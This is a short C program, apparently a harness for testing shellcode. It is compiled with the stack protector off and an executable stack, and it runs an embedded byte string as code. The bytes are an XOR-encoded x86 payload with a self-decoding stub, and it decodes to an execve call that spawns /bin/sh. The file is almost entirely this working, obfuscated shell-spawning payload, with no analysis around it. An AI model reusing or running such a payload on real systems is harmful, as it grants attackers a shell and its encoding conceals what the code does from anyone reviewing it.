/*
A simple program to test shellcode
gcc -fno-stack-protector -z execstack tshell.c
*/

#include <stdio.h>
#include <string.h>

unsigned char code[]= \
"\xeb\x09\x5b\x80\x33\xaa\x74\x08\x43\xeb\xf8\xe8\xf2\xff\xff\xff\x9b\x6a\xfa\xc2"
"\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x1a\xa1\x23\x49\x67\x2a\xaa";

main()
{
	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}

